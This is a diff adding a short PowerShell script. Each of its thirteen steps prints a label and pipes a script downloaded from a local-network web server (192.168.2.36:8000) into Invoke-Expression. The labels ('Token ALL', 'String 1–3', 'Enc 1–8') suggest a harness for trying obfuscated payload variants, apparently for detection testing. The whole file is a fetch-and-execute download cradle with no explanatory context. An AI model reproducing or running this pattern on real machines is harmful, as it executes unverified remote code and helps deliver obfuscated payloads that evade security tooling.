@@ -1,0 +1,26 @@
+Write-Host 'BASE';
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script.ps1");
+Write-Host 'Token ALL';
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_token_all.ps1");
+Write-Host 'String 1';
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_string_1.ps1");
+Write-Host 'String 2';
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_string_2.ps1");           
+Write-Host 'String 3';
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_string_3.ps1");           
+Write-Host 'Enc 1';
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_1.ps1");           
+Write-Host 'Enc 2'
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_2.ps1");
+Write-Host 'Enc 3'
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_3.ps1");
+Write-Host 'Enc 4'
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_4.ps1");
+Write-Host 'Enc 5'
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_5.ps1");
+Write-Host 'Enc 6'
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_6.ps1");
+Write-Host 'Enc 7'
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_7.ps1");
+Write-Host 'Enc 8'
+Invoke-Expression (New-Object Net.WebClient).Downloadstring("http://192.168.2.36:8000/script_enc_8.ps1");
